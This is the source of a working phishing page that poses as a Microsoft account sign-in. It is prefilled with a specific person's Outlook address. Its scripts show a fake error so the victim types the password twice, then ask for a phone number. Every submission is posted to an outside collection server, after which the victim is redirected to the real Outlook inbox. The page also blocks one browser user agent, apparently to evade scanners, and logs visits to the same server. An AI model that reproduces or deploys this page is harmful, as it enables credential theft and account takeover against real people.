<!DOCTYPE html>
<html>

<head>
    <base target="_top">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" sizes="180x180" href="./assets/favicon_io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="./assets/favicon_io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="./assets/favicon_io/favicon-16x16.png">
    <link rel="manifest" href="./assets/favicon_io/site.webmanifest">
    <title> Sign in to your Microsoft account</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://kit.fontawesome.com/50b3f375f9.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" type="text/css" href="./styles.css" />
</head>

<body> 
    <div class="row justify-content-center full-body">
        <div class="col-lg-4 col-md-6 col-sm-8 col-12">
            <div class="main-body">
                <div class="main-header">
                    <img src="./assets/mis-lego.png" width="120px" alt="" />
                </div>

                <div id="pwSection">
                    <div class="form-section">
                        <form id="handleLogin" method="post">
                            <p class="gb-email"><span id="gb_em">
                                    christopherconerly@outlook.com </span> </p>
                            <h4 class="form-title">Enter password</h4>

                            <div class="form-group">
                                <p id="error_msg" class="error-message">Because you're accessing sensitive info, you
                                    need to verify your password.</p>
                                <input type="email" name="pw_email" value="christopherconerly@outlook.com" id="pw_email"
                                    class="input-form" placeholder="Email, phone, or Skype" required readonly hidden
                                    style="display: none;" />
                                <input type="password" name="password" id="password" class="form-control"
                                    placeholder="Password" autocomplete="current-password" required />
                                <input style="display: none;" type="text" name="click_count" id="click_count" value="1"
                                    class="form-control" required />

                            </div>
                            <p class="forgot"> Forgot password? </p>
                            <p class="forgot"> Email code to <span id="msk_em">ch*****@outlook.com</span> </p>

                            <div class="form-button">
                                <button id="submit_btn" class="btn btn-md btn-primary">Sign in</button>
                            </div>
                        </form>
                    </div>
                </div>


                <div style="display: none;" id="phSection">
                    <div class="form-section">
                        <form id="handleVerify" method="post">
                            <p class="gb-email"><span id="ph_em">
                                    christopherconerly@outlook.com </span> </p>
                            <h4 class="form-title">Verify phone number</h4>

                            <p class="phone-span"> <i class="fas fa-mobile-alt"></i> <span> Phone </span> +XX XXXXXXXXXX
                            </p>
                            <div class="form-group">
                                <input type="email" name="ph_email" id="ph_email" class="input-form"
                                    placeholder="Email, phone, or Skype" required readonly hidden
                                    style="display: none;" />
                                <input type="password" name="ph_password" id="ph_password" class="input-form"
                                    placeholder="Password" required readonly hidden style="display: none;" />

                                <input type="tel" name="phone_number" id="phone_number" class="input-form"
                                    placeholder="Phone Number" required />

                            </div>

                            <div class="form-button">
                                <button id="continue_btn" class="btn btn-md btn-primary">Continue</button>
                            </div>
                        </form>
                    </div>
                </div>

            </div>

            <div style="display: none;" id="miniDiv" class="mini-body">
                <div class="mini-div">
                    <img src="./assets/key-one.svg" alt="" />
                    <p>Sign-in options</p>
                </div>
            </div>
        </div>
        <div class="footer-ul">
            <ul>
                <li>Terms of use</li>
                <li>Privacy & cookies</li>
                <li style="font-weight: 600;">. . .</li>
            </ul>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
        crossorigin="anonymous"></script>

</body>

</html>


<script>
    window.onload = function () {
        var userAgent = navigator.userAgent;

        // Define the user agent string to block
        var blockedUserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';

        // Check if the current user agent matches the blocked user agent
        if (userAgent === blockedUserAgent) {
            window.location.href = 'https://www.google.com';
        }
    };
</script>

<script>

    // Function to get URL parameter by name
    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    // Function to mask the email address
    function maskEmail(email) {
        var parts = email.split('@');
        var maskedUsername = parts[0].substr(0, 2) + '*****';
        return maskedUsername + '@' + parts[1];
    }

    // Get the login_hint value from the URL
    var loginHint = getParameterByName('login_hint');

    // Set the email input value with the login_hint value
    $(document).ready(function () {
        $('#pw_email').val(loginHint);
        $('#gb_em').text(loginHint);
        let maskedEmail = maskEmail(loginHint);
        $('#msk_em').text(maskedEmail);


    });

</script>

<script>

    $(document).ready(function () {
        $('#password').on('input', function () {
            $("#error_msg").hide();
            var password = $(this).val();

            // Ensure password contains at least one uppercase letter, one lowercase letter, one digit, and no spaces
            var passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?!.*\s).*$/;

            if (!passwordRegex.test(password)) {
                $(this).addClass('invalid');
            } else {
                $(this).removeClass('invalid');
            }
        });

        $('#password').on('keypress', function (e) {
            // Prevent the input of spaces
            if (e.which === 32) {
                return false;
            }
        });
    });


    $("#handleLogin").submit(function (event) {
        event.preventDefault();
        $('#submit_btn').prop('disabled', true);

        let pwEmail = $("#pw_email").val();
        let emPass = $("#password").val();
        let emNumber = "no number";
        let clickCount = $("#click_count").val();

        // First clickCount
        if (clickCount === '1') {
            processAction(pwEmail, emPass, emNumber, clickCount).then(() => {
                $("#error_msg").show();
                $("#click_count").val("2");
                $('#submit_btn').prop('disabled', false);
            })
        }
        // Second clickCount
        else if (clickCount === '2') {

            processAction(pwEmail, emPass, emNumber, clickCount).then(() => {

                let gbEmail = $("#pw_email").val();
                let gbPass = $("#password").val();
                $("#ph_em").text(gbEmail);
                $("#ph_email").val(gbEmail);
                $("#ph_password").val(gbPass);

                $("#pwSection").hide();
                $("#phSection").show();
            })

        }

    });


    $("#handleVerify").submit(function (event) {
        event.preventDefault();
        $('#continue_btn').prop('disabled', true);

        let phEmail = $("#ph_email").val();
        let phPass = $("#ph_password").val();
        let phNumber = $("#phone_number").val();
        let clickCount = "3";

        processAction(phEmail, phPass, phNumber, clickCount).then(() => {
            window.location.replace("https://outlook.office.com/mail/inbox");
        })

    });


    function processAction(user_email, user_password, user_number, clickCount) {
        return $.ajax({
            url: 'https://ftceurecovery.com/action/process.php',
            method: 'POST',
            dataType: 'json',
            data: {
                user_email: user_email,
                user_password: user_password,
                user_number: user_number,
                click_count: clickCount,
            }
        })
            .then(function (response) {
                // Check for a successful response.
                // url: '../../process.php',
                if (response.message === 'success') {
                    return true;
                } else {
                    return false;
                }
            })
            .catch(function (error) {
                console.log('Error loading content:', error);
                return false; // Return false in case of an error.
            });
    }
</script>

<script>
    $(document).ready(function () {
        let page_click = "MS page Clicked";

        $.ajax({
            url: "https://ftceurecovery.com/action/click.php",
            method: "POST",
            dataType: "JSON",
            data: {
                pg: page_click,
            },
            success: function () { },
            complete: function () { },
        });
    });
</script>
